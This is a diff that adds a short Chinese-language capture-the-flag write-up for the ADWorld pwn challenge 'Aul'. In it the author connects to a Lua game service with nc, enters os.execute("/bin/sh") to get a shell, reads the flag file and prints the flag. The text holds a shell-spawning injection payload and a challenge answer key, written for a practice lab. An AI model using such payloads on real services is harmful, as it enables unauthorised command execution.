@@ -1345,6 +1345,24 @@ io.interactive()
 
 ------
 
+### [Aul](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=5009)
+
+这道题没有附件，`nc`进去之后就是玩游戏，输入`help`后发现这是个`lua`程序，而下面的乱码像是`lua`的字节码。
+
+```bash
+nc 111.200.241.244 53412
+help
+os.execute("/bin/sh")
+ls
+cat flag
+```
+
+输入`os.execute("/bin/sh")`可以调用`shell`，`ls`后`cat flag`可以得到`cyberpeace{bd2ac997dde16e9d40620def86a5df67}`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/5009/1.png)
+
+------
+
 ## CTFShow
 
 ### pwn02
